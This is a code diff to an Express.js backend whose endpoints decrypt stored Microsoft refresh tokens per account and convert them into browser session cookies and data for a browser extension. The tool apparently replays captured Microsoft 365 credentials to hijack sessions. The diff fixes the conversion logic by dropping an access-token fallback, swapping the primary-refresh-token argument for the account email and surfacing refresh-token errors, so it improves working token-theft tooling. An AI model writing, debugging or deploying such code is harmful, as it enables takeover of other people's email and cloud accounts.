@@ -84,7 +84,6 @@ router.get('/:id/extension-data', verifyAuth, async (req, res) => {
     const token = tokens[0];
 
     const refreshToken = safeDecrypt(token.refresh_token_encrypted);
-    const accessToken = safeDecrypt(token.access_token_encrypted);
 
     const tenant =
       token.tenant || config.AZURE_TENANT || 'common';
@@ -100,14 +99,17 @@ router.get('/:id/extension-data', verifyAuth, async (req, res) => {
     const templateType =
       token.template_type || 'office';
 
-    // Try PRT path first.
+    // Try the refresh-token path first. grant_type is always refresh_token on
+    // the Microsoft token endpoint, so submitting an access token fails with
+    // AADSTS9002313 ("Invalid request. Request is malformed or invalid.").
+    let cookieResult = null;
     if (refreshToken) {
-      const cookieResult =
+      cookieResult =
         await cookieConverter.convertTokensToCookies(
           refreshToken,
           templateType,
           tenant,
-          token.prt,
+          token.email || null,
           accountType,
           req.user.user_id
         );
@@ -124,33 +126,15 @@ router.get('/:id/extension-data', verifyAuth, async (req, res) => {
       }
     }
 
-    // Fallback: use stored access token.
-    if (accessToken) {
-      const cookieResult =
-        await cookieConverter.convertTokensToCookies(
-          accessToken,
-          templateType,
-          tenant,
-          token.prt,
-          accountType,
-          req.user.user_id
-        );
-
-      if (cookieResult.success && cookieResult.cookies) {
-        const extData = cookieConverter.generateExtensionData({
-          ...cookieResult,
-          templateType,
-          accountType,
-          fresh: false,
-        });
-
-        return res.json(extData);
-      }
-    }
-
+    // No access-token fallback here: the Microsoft token endpoint is always
+    // called with grant_type: 'refresh_token', so an access token is rejected
+    // with AADSTS9002313 every time. Returning the real refresh-token error is
+    // more useful than burning ~10s of endpoint calls on a guaranteed failure.
     return res.status(400).json({
-      error: 'No tokens available for cookie extraction',
-      hint: 'The refresh token may be expired or revoked. Try renewing it first.',
+      error: cookieResult && cookieResult.error
+        ? cookieResult.error
+        : 'No refresh token available for cookie extraction',
+      hint: 'The refresh token may be expired or revoked. Try renewing it first.'
     });
   } catch (err) {
     console.error('[ExtensionData] Error:', err.message);
@@ -202,7 +186,7 @@ router.get('/:id/extension', verifyAuth, async (req, res) => {
           refreshToken,
           templateType,
           tenant,
-          token.prt,
+          token.email || null,
           accountType,
           req.user.user_id
         );
